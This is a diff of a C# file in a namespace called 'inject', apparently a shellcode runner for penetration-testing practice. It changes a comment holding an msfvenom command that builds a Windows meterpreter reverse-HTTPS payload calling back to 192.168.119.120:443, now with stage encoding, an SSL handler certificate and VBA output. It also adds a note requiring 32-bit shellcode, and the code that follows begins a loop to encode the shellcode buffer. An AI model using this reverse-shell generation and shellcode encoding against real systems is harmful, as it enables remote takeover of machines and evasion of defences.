@@ -13,8 +13,8 @@ namespace inject
      
         static void Main(string[] args)
         {
-        	//msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f csharp
-        	
+        	//msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread enablestageencoding=true handlersslcert=justice.pem -f vbapplication
+        	//note that the shellcode must be for 32-bits
             byte[] encoded = new byte[buf.Length];
             for(int i = 0; i < buf.Length; i++)
             {
